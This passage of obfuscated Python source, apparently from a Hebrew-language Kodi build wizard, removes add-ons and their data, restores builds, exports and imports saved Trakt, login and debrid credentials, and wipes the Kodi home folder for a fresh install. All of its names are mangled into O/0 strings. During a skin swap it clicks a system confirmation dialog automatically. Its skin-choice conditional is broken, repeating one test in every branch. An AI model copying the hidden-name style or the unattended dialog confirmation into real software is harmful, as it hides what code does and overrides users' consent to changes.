		OO0O0OO00O000O00O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0O00OOO000O0O0 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O0O0O0O0000O0OO0O ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4600
	if OO0O0OO00O000O00O ==1 :#line:4601
		OOO0O00O0OOOO00OO =os .path .join (ADDONS ,O0O0O0O0000O0OO0O )#line:4602
		wiz .log ("Removing Addon %s"%O0O0O0O0000O0OO0O )#line:4603
		wiz .cleanHouse (OOO0O00O0OOOO00OO )#line:4604
		xbmc .sleep (1000 )#line:4605
		try :shutil .rmtree (OOO0O00O0OOOO00OO )#line:4606
		except Exception as O00OOO00OOO00O0OO :wiz .log ("Error removing %s"%O0O0O0O0000O0OO0O ,xbmc .LOGNOTICE )#line:4607
		removeAddonData (O0O0O0O0000O0OO0O ,OOO0O00OOO000O0O0 ,over )#line:4608
	if over ==False :#line:4609
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OOO0O00OOO000O0O0 ))#line:4610
def removeAddonData (OOO0O0O000O0OO000 ,name =None ,over =False ):#line:4612
	if OOO0O0O000O0OO000 =='all':#line:4613
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4614
			wiz .cleanHouse (ADDOND )#line:4615
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4616
	elif OOO0O0O000O0OO000 =='uninstalled':#line:4617
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4618
			O0O000OO00O00OOO0 =0 #line:4619
			for OOO000OO0O000O00O in glob .glob (os .path .join (ADDOND ,'*')):#line:4620
				OO00OOO0O0O00O0OO =OOO000OO0O000O00O .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4621
				if OO00OOO0O0O00O0OO in EXCLUDES :pass #line:4622
				elif os .path .exists (os .path .join (ADDONS ,OO00OOO0O0O00O0OO )):pass #line:4623
				else :wiz .cleanHouse (OOO000OO0O000O00O );O0O000OO00O00OOO0 +=1 ;wiz .log (OOO000OO0O000O00O );shutil .rmtree (OOO000OO0O000O00O )#line:4624
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0O000OO00O00OOO0 ))#line:4625
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4626
	elif OOO0O0O000O0OO000 =='empty':#line:4627
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4628
			O0O000OO00O00OOO0 =wiz .emptyfolder (ADDOND )#line:4629
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0O000OO00O00OOO0 ))#line:4630
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4631
	else :#line:4632
		O0OOO0OOO0000OOO0 =os .path .join (USERDATA ,'addon_data',OOO0O0O000O0OO000 )#line:4633
		if OOO0O0O000O0OO000 in EXCLUDES :#line:4634
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4635
		elif os .path .exists (O0OOO0OOO0000OOO0 ):#line:4636
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0O0O000O0OO000 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4637
				wiz .cleanHouse (O0OOO0OOO0000OOO0 )#line:4638
				try :#line:4639
					shutil .rmtree (O0OOO0OOO0000OOO0 )#line:4640
				except :#line:4641
					wiz .log ("Error deleting: %s"%O0OOO0OOO0000OOO0 )#line:4642
			else :#line:4643
				wiz .log ('Addon data for %s was not removed'%OOO0O0O000O0OO000 )#line:4644
	wiz .refresh ()#line:4645
def restoreit (O0O0O0O00000O0000 ):#line:4647
	if O0O0O0O00000O0000 =='build':#line:4648
		OO000O000OOO0OOOO =freshStart ('restore')#line:4649
		if OO000O000OOO0OOOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4650
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4651
		wiz .skinToDefault ()#line:4652
	wiz .restoreLocal (O0O0O0O00000O0000 )#line:4653
def restoreextit (O0OO000OO000O0000 ):#line:4655
	if O0OO000OO000O0000 =='build':#line:4656
		OO000O00000O00O00 =freshStart ('restore')#line:4657
		if OO000O00000O00O00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4658
	wiz .restoreExternal (O0OO000OO000O0000 )#line:4659
def buildInfo (O0OO0OO000OOO0O00 ):#line:4661
	if wiz .workingURL (SPEEDFILE )==True :#line:4662
		if wiz .checkBuild (O0OO0OO000OOO0O00 ,'url'):#line:4663
			O0OO0OO000OOO0O00 ,O000O0OO00OOOOO0O ,OOOO000000OOOO0O0 ,OO00OOO0O0OOOO00O ,OOOO0000000000OOO ,OOO00OO000O0000O0 ,OO00000O0OOOOOOO0 ,O00O00O00000000OO ,O0OOO0000OO0O000O ,O00O00O0O00O00OOO ,O000000OO00000O00 =wiz .checkBuild (O0OO0OO000OOO0O00 ,'all')#line:4664
			O00O00O0O00O00OOO ='Yes'if O00O00O0O00O00OOO .lower ()=='yes'else 'No'#line:4665
			O0O00O00O000OOOO0 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OO0OO000OOO0O00 )#line:4666
			O0O00O00O000OOOO0 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000O0OO00OOOOO0O )#line:4667
			if not OOO00OO000O0000O0 =="http://":#line:4668
				O000O00O0O000OO0O =wiz .themeCount (O0OO0OO000OOO0O00 ,False )#line:4669
				O0O00O00O000OOOO0 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O000O00O0O000OO0O ))#line:4670
			O0O00O00O000OOOO0 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOO0000000000OOO )#line:4671
			O0O00O00O000OOOO0 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00O00O0O00O00OOO )#line:4672
			O0O00O00O000OOOO0 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000000OO00000O00 )#line:4673
			wiz .TextBox (ADDONTITLE ,O0O00O00O000OOOO0 )#line:4674
		else :wiz .log ("Invalid Build Name!")#line:4675
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4676
def buildVideo (O0OO00OO00000O000 ):#line:4678
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4679
	if wiz .workingURL (SPEEDFILE )==True :#line:4680
		O0OOOO000OOO0000O =wiz .checkBuild (O0OO00OO00000O000 ,'preview')#line:4681
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O0OO00OO00000O000 )#line:4682
		if O0OOOO000OOO0000O and not O0OOOO000OOO0000O =='http://':playVideo (O0OOOO000OOO0000O )#line:4683
		else :wiz .log ("[%s]Unable to find url for video preview"%O0OO00OO00000O000 )#line:4684
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4685
def dependsList (OOOO0OO0OO00OO0OO ):#line:4687
	OO0OOO00O0OO000O0 =os .path .join (ADDONS ,OOOO0OO0OO00OO0OO ,'addon.xml')#line:4688
	if os .path .exists (OO0OOO00O0OO000O0 ):#line:4689
		O00OO0O0000OO0000 =open (OO0OOO00O0OO000O0 ,mode ='r');O0O0000OOOOO0OOO0 =O00OO0O0000OO0000 .read ();O00OO0O0000OO0000 .close ();#line:4690
		O0OO0O0OO0000O0OO =wiz .parseDOM (O0O0000OOOOO0OOO0 ,'import',ret ='addon')#line:4691
		O00OOO0OO0O00OO00 =[]#line:4692
		for OOO000O0000OOOOOO in O0OO0O0OO0000O0OO :#line:4693
			if not 'xbmc.python'in OOO000O0000OOOOOO :#line:4694
				O00OOO0OO0O00OO00 .append (OOO000O0000OOOOOO )#line:4695
		return O00OOO0OO0O00OO00 #line:4696
	return []#line:4697
def manageSaveData (OO000000O000OO000 ):#line:4699
	if OO000000O000OO000 =='import':#line:4700
		OO00OOO0OO0O0O000 =os .path .join (ADDONDATA ,'temp')#line:4701
		if not os .path .exists (OO00OOO0OO0O0O000 ):os .makedirs (OO00OOO0OO0O0O000 )#line:4702
		OOOOO00O00000OO0O =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4703
		if not OOOOO00O00000OO0O .endswith ('.zip'):#line:4704
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4705
			return #line:4706
		OO0OOO0OO0OOO000O =os .path .join (MYBUILDS ,'SaveData.zip')#line:4707
		OO0000O000OOOOOOO =xbmcvfs .copy (OOOOO00O00000OO0O ,OO0OOO0OO0OOO000O )#line:4708
		wiz .log ("%s"%str (OO0000O000OOOOOOO ))#line:4709
		extract .all (xbmc .translatePath (OO0OOO0OO0OOO000O ),OO00OOO0OO0O0O000 )#line:4710
		O0OOO0OOO000O00O0 =os .path .join (OO00OOO0OO0O0O000 ,'trakt')#line:4711
		OO00O00O000O0OOO0 =os .path .join (OO00OOO0OO0O0O000 ,'login')#line:4712
		OOO0OOOOOO0OOOOO0 =os .path .join (OO00OOO0OO0O0O000 ,'debrid')#line:4713
		OOO0OOO0O00OOO00O =0 #line:4714
		if os .path .exists (O0OOO0OOO000O00O0 ):#line:4715
			OOO0OOO0O00OOO00O +=1 #line:4716
			O0O0O00000O0OOO0O =os .listdir (O0OOO0OOO000O00O0 )#line:4717
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4718
			for OOO0O000OO00O00O0 in O0O0O00000O0OOO0O :#line:4719
				OO000OOOO000O00OO =os .path .join (traktit .TRAKTFOLD ,OOO0O000OO00O00O0 )#line:4720
				O000OOOO000000OO0 =os .path .join (O0OOO0OOO000O00O0 ,OOO0O000OO00O00O0 )#line:4721
				if os .path .exists (OO000OOOO000O00OO ):#line:4722
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOO0O000OO00O00O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4723
					else :os .remove (OO000OOOO000O00OO )#line:4724
				shutil .copy (O000OOOO000000OO0 ,OO000OOOO000O00OO )#line:4725
			traktit .importlist ('all')#line:4726
			traktit .traktIt ('restore','all')#line:4727
		if os .path .exists (OO00O00O000O0OOO0 ):#line:4728
			OOO0OOO0O00OOO00O +=1 #line:4729
			O0O0O00000O0OOO0O =os .listdir (OO00O00O000O0OOO0 )#line:4730
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4731
			for OOO0O000OO00O00O0 in O0O0O00000O0OOO0O :#line:4732
				OO000OOOO000O00OO =os .path .join (loginit .LOGINFOLD ,OOO0O000OO00O00O0 )#line:4733
				O000OOOO000000OO0 =os .path .join (OO00O00O000O0OOO0 ,OOO0O000OO00O00O0 )#line:4734
				if os .path .exists (OO000OOOO000O00OO ):#line:4735
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOO0O000OO00O00O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4736
					else :os .remove (OO000OOOO000O00OO )#line:4737
				shutil .copy (O000OOOO000000OO0 ,OO000OOOO000O00OO )#line:4738
			loginit .importlist ('all')#line:4739
			loginit .loginIt ('restore','all')#line:4740
		if os .path .exists (OOO0OOOOOO0OOOOO0 ):#line:4741
			OOO0OOO0O00OOO00O +=1 #line:4742
			O0O0O00000O0OOO0O =os .listdir (OOO0OOOOOO0OOOOO0 )#line:4743
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4744
			for OOO0O000OO00O00O0 in O0O0O00000O0OOO0O :#line:4745
				OO000OOOO000O00OO =os .path .join (debridit .REALFOLD ,OOO0O000OO00O00O0 )#line:4746
				O000OOOO000000OO0 =os .path .join (OOO0OOOOOO0OOOOO0 ,OOO0O000OO00O00O0 )#line:4747
				if os .path .exists (OO000OOOO000O00OO ):#line:4748
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOO0O000OO00O00O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4749
					else :os .remove (OO000OOOO000O00OO )#line:4750
				shutil .copy (O000OOOO000000OO0 ,OO000OOOO000O00OO )#line:4751
			debridit .importlist ('all')#line:4752
			debridit .debridIt ('restore','all')#line:4753
		wiz .cleanHouse (OO00OOO0OO0O0O000 )#line:4754
		wiz .removeFolder (OO00OOO0OO0O0O000 )#line:4755
		os .remove (OO0OOO0OO0OOO000O )#line:4756
		if OOO0OOO0O00OOO00O ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4757
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4758
	elif OO000000O000OO000 =='export':#line:4759
		O000O000OOOO000O0 =xbmc .translatePath (MYBUILDS )#line:4760
		O00000000O0O0O0OO =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4761
		traktit .traktIt ('update','all')#line:4762
		loginit .loginIt ('update','all')#line:4763
		debridit .debridIt ('update','all')#line:4764
		OOOOO00O00000OO0O =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4765
		OOOOO00O00000OO0O =xbmc .translatePath (OOOOO00O00000OO0O )#line:4766
		OO00OO00OO0OO000O =os .path .join (O000O000OOOO000O0 ,'SaveData.zip')#line:4767
		OO00000000O0O000O =zipfile .ZipFile (OO00OO00OO0OO000O ,mode ='w')#line:4768
		for OOOO0OO0OOOOOO0OO in O00000000O0O0O0OO :#line:4769
			if os .path .exists (OOOO0OO0OOOOOO0OO ):#line:4770
				O0O0O00000O0OOO0O =os .listdir (OOOO0OO0OOOOOO0OO )#line:4771
				for OO0OO00OO00OO0O00 in O0O0O00000O0OOO0O :#line:4772
					OO00000000O0O000O .write (os .path .join (OOOO0OO0OOOOOO0OO ,OO0OO00OO00OO0O00 ),os .path .join (OOOO0OO0OOOOOO0OO ,OO0OO00OO00OO0O00 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4773
		OO00000000O0O000O .close ()#line:4774
		if OOOOO00O00000OO0O ==O000O000OOOO000O0 :#line:4775
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00OO00OO0OO000O ))#line:4776
		else :#line:4777
			try :#line:4778
				xbmcvfs .copy (OO00OO00OO0OO000O ,os .path .join (OOOOO00O00000OO0O ,'SaveData.zip'))#line:4779
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OOOOO00O00000OO0O ,'SaveData.zip')))#line:4780
			except :#line:4781
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00OO00OO0OO000O ))#line:4782
def freshStart (install =None ,over =False ):#line:4787
	if USERNAME =='':#line:4788
		ADDON .openSettings ()#line:4789
		sys .exit ()#line:4790
	O0OOO00O0000000OO =u_list (SPEEDFILE )#line:4791
	(O0OOO00O0000000OO )#line:4792
	O0000O0O0OOOOO0OO =(wiz .workingURL (O0OOO00O0000000OO ))#line:4793
	(O0000O0O0OOOOO0OO )#line:4794
	if KEEPTRAKT =='true':#line:4795
		traktit .autoUpdate ('all')#line:4796
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4797
	if KEEPREAL =='true':#line:4798
		debridit .autoUpdate ('all')#line:4799
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4800
	if KEEPLOGIN =='true':#line:4801
		loginit .autoUpdate ('all')#line:4802
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4803
	if over ==True :OOO00OOOOO000OOOO =1 #line:4804
	elif install =='restore':OOO00OOOOO000OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4805
	elif install :OOO00OOOOO000OOOO =1 #line:4806
	else :OOO00OOOOO000OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4807
	if OOO00OOOOO000OOOO :#line:4808
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4809
			OO0OOO0OOO0000O0O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4810
			skinSwitch .swapSkins (OO0OOO0OOO0000O0O )#line:4813
			O0OOOO000OOOOOO00 =0 #line:4814
			xbmc .sleep (1000 )#line:4815
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OOOO000OOOOOO00 <150 :#line:4816
				O0OOOO000OOOOOO00 +=1 #line:4817
				xbmc .sleep (1000 )#line:4818
				wiz .ebi ('SendAction(Select)')#line:4819
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4820
				wiz .ebi ('SendClick(11)')#line:4821
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4822
			xbmc .sleep (1000 )#line:4823
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4824
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4825
			return #line:4826
		wiz .addonUpdates ('set')#line:4827
		OO000O0O000O0OOO0 =os .path .abspath (HOME )#line:4828
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4829
		OO0OO00OO00O000O0 =sum ([len (OO000000O00O0OO0O )for O00000O00000000O0 ,OOO000OO00O0O00O0 ,OO000000O00O0OO0O in os .walk (OO000O0O000O0OOO0 )]);O0000OO0OOO0O000O =0 #line:4830
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4831
		EXCLUDES .append ('My_Builds')#line:4832
		EXCLUDES .append ('archive_cache')#line:4833
		EXCLUDES .append ('script.module.requests')#line:4834
		EXCLUDES .append ('myfav.anon')#line:4835
		if KEEPREPOS =='true':#line:4836
			OOOO0O0O00OO0OO0O =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4837
			for OOO0O000O0OOOO00O in OOOO0O0O00OO0OO0O :#line:4838
				OO000000O0O00O00O =os .path .split (OOO0O000O0OOOO00O [:-1 ])[1 ]#line:4839
				if not OO000000O0O00O00O ==EXCLUDES :#line:4840
					EXCLUDES .append (OO000000O0O00O00O )#line:4841
		if KEEPSUPER =='true':#line:4842
			EXCLUDES .append ('plugin.program.super.favourites')#line:4843
		if KEEPMOVIELIST =='true':#line:4844
			EXCLUDES .append ('plugin.video.metalliq')#line:4845
		if KEEPMOVIELIST =='true':#line:4846
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4847
		if KEEPADDONS =='true':#line:4848
			EXCLUDES .append ('addons')#line:4849
		if KEEPADDONS =='true':#line:4850
			EXCLUDES .append ('addon_data')#line:4851
		EXCLUDES .append ('plugin.video.elementum')#line:4854
		EXCLUDES .append ('script.elementum.burst')#line:4855
		EXCLUDES .append ('script.elementum.burst-master')#line:4856
		EXCLUDES .append ('plugin.video.quasar')#line:4857
		EXCLUDES .append ('script.quasar.burst')#line:4858
		EXCLUDES .append ('skin.estuary')#line:4859
		if KEEPWHITELIST =='true':#line:4862
			OOOOO000O0O000O00 =''#line:4863
			O0OO0O000OOOOO0OO =wiz .whiteList ('read')#line:4864
			if len (O0OO0O000OOOOO0OO )>0 :#line:4865
				for OOO0O000O0OOOO00O in O0OO0O000OOOOO0OO :#line:4866
					try :OO00OO0000000OO00 ,OOOO0O0OO000OOOOO ,OOO000O00O00O00OO =OOO0O000O0OOOO00O #line:4867
					except :pass #line:4868
					if OOO000O00O00O00OO .startswith ('pvr'):OOOOO000O0O000O00 =OOOO0O0OO000OOOOO #line:4869
					OOOO00OOOOOO0OO00 =dependsList (OOO000O00O00O00OO )#line:4870
					for O0O0OOOOO0OOO0OOO in OOOO00OOOOOO0OO00 :#line:4871
						if not O0O0OOOOO0OOO0OOO in EXCLUDES :#line:4872
							EXCLUDES .append (O0O0OOOOO0OOO0OOO )#line:4873
						O000O00O00OO00O0O =dependsList (O0O0OOOOO0OOO0OOO )#line:4874
						for O0OOO0OOOO000000O in O000O00O00OO00O0O :#line:4875
							if not O0OOO0OOOO000000O in EXCLUDES :#line:4876
								EXCLUDES .append (O0OOO0OOOO000000O )#line:4877
					if not OOO000O00O00O00OO in EXCLUDES :#line:4878
						EXCLUDES .append (OOO000O00O00O00OO )#line:4879
				if not OOOOO000O0O000O00 =='':wiz .setS ('pvrclient',OOO000O00O00O00OO )#line:4880
		if wiz .getS ('pvrclient')=='':#line:4881
			for OOO0O000O0OOOO00O in EXCLUDES :#line:4882
				if OOO0O000O0OOOO00O .startswith ('pvr'):#line:4883
					wiz .setS ('pvrclient',OOO0O000O0OOOO00O )#line:4884
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4885
		O0OO00O0O000000OO =wiz .latestDB ('Addons')#line:4886
		for OO0O00O0OO0O00000 ,OOO0OO0O00O0O00O0 ,OOO00OOOO0OO0O0OO in os .walk (OO000O0O000O0OOO0 ,topdown =True ):#line:4887
			OOO0OO0O00O0O00O0 [:]=[OO00O00OO0OOOOOOO for OO00O00OO0OOOOOOO in OOO0OO0O00O0O00O0 if OO00O00OO0OOOOOOO not in EXCLUDES ]#line:4888
			for OO00OO0000000OO00 in OOO00OOOO0OO0O0OO :#line:4889
				O0000OO0OOO0O000O +=1 #line:4890
				OOO000O00O00O00OO =OO0O00O0OO0O00000 .replace ('/','\\').split ('\\')#line:4891
				O0OOOO000OOOOOO00 =len (OOO000O00O00O00OO )-1 #line:4893
				if OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4894
				elif OO00OO0000000OO00 =='MyVideos99.db'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4895
				elif OO00OO0000000OO00 =='MyVideos107.db'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4896
				elif OO00OO0000000OO00 =='MyVideos116.db'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4897
				elif OO00OO0000000OO00 =='MyVideos99.db'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4898
				elif OO00OO0000000OO00 =='MyVideos107.db'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4899
				elif OO00OO0000000OO00 =='MyVideos116.db'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4900
				elif OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4901
